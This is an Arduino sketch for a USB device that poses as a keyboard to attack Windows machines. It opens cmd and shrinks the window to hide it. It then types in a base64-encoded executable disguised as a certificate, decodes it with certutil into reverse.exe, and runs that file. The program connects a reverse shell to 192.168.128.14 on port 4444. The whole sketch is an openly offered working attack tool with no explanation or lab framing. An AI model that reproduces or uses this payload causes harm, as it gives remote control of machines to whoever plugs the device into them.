#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // ASM Reverse Shell
  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("mode con:cols=18 lines=1");

  typeKey(KEY_RETURN);

  Keyboard.print("echo -----BEGIN CERTIFICATE----- > encoded.txt");

  typeKey(KEY_RETURN);

  Keyboard.print("echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADhshgBpdN2UqXTdlKl03ZSK8xlUqvTdlJZ82RSoNN2UlJpY2il03ZSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAEwBAwA19TtYAAAAAAAAAADgAA8BCwEFDAAEAAAABgAAAAAAAAAQAAAAEAAAACAAAAAAQAAAEAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAQAAAAAQAAAAAAAACAAAAAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAAAAAsIAAAPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAACwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAABQDAAAAEAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAAAsAQAAACAAAAACAAAACAAAAAAAAAAAAAAAAAAAQAAAQC5kYXRhAAAAQAIAAAAwAAAAAgAAAAoAAAAAAAAAAAAAAAAAAEAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> encoded.txt");

  typeKey(KEY_RETURN);

  Keyboard.print("echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGgGMkAAagHoAAEAAGgGMkAA6EICAABoODJAAGoC6OoAAABoODJAAOgsAgAAaHQwQABoAQEAAOixAAAAagBqAGoAagZqAWoC6JoAAACjAjJAAGbHBWQwQAACAGg4MkAA6LwBAABQ6JQAAABmo2YwQABoBjJAAOh+AAAAi0AMiwCLAKNoMEAAoQIyQACjSDBAAKNMMEAAo1AwQADHBRAwQABEAAAAxwU8MEAAAQEAAGoQaGQwQAD/NQIyQADoMgAAAGhUMEAAaBAwQABqAGoAaEAAAAhqAWoAagBoADBAAGoA6B8AAADD>> encoded.txt");

  typeKey(KEY_RETURN);

  Keyboard.print("echo /yUkIEAA/yUcIEAA/yUYIEAA/yUUIEAA/yUgIEAA/yUIIEAAzMxVi+yBxHz+//9WV+jmAQAAiUX8M8mLdfysPAB0BzwidfdB6/RR0enR4Vg7wXQLX164AwAAAMnCCACLdfyNvTz///+sPAB0CTwJdQKwIKrr8qqNhTz///+L8Iv4rDwAdQLrGzwidQOq6wOq6++sPCB1ArD+PCJ1A6rr4arr76qNhTz///+L8I29fP7//7kAAAAArDwgdPs7TQh0Faw8AHQdPCB1Cqw8IHT7QTwAdA/r5qqsPCB0BzwAdAOq6/SwAKo7TQhzEYt9DLAAqrgCAAAAX17JwggAjYV8/v//i/CLfQysPAB0DTwidPc8/nUCsCCq6+6qi3UMrDwAdQtfXrgEAAAAycIIALgBAAAAX17JwggAzMxVi+xWVzPAi3UIM8kz0ooGRjwCdRKKBvfSRusLLDCNDImNDEiKBkYKwHXxjQQRM8JfXsnCBADMzFWL7IPE9Gr16KMAAACJRfz/dQjoIAAAAIlF9GoAjUX4UP919P91CP91/OiHAAAAi0X4ycIEAMzMi0QkBI1QA1VXvYCAgICLOIPABI2P//7+/vfXI88jzXU5iziDwASNj//+/v731yPPI811Jos4g8AEjY///v7+99cjzyPNdROLOIPABI2P//7+/vfXI88jzXS098GAgAAAdQbB6RCDwALQ4RvCX13CBADM/yUEIEAA/yUMIEAA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> encoded.txt");

  typeKey(KEY_RETURN);

  Keyboard.print("echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgIQAA/iAAAN4gAAAQIQAAAAAAALogAACwIAAAoiAAAMogAACUIAAAAAAAAHwgAAAAAAAAAAAAANIgAAAUIAAAaCAAAAAAAAAAAAAA8CAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAhAAD+IAAA3iAAABAhAAAAAAAAuiAAALAgAACiIAAAyiAAAJQgAAAAAAAAQQBXU0FTb2NrZXRBAABDAFdTQVN0YXJ0dXAAAFYAY29ubmVjdABaAGdldGhvc3RieW5hbWUAZQBodG9ucwB3czJfMzIuZGxsAABPAENyZWF0ZVByb2Nlc3NBAABrZXJuZWwzMi5kbGwAAOYAR2V0Q29tbWFuZExpbmVBAGoBR2V0U3RkSGFuZGxlAAD3AldyaXRlRmlsZQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> encoded.txt");

  typeKey(KEY_RETURN);

  Keyboard.print("echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGNtZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> encoded.txt");

  typeKey(KEY_RETURN);

  Keyboard.print("echo -----END CERTIFICATE----- >> encoded.txt");

  typeKey(KEY_RETURN);

  Keyboard.print("certutil -decode encoded.txt reverse.exe");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("reverse.exe 192.168.128.14 4444");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}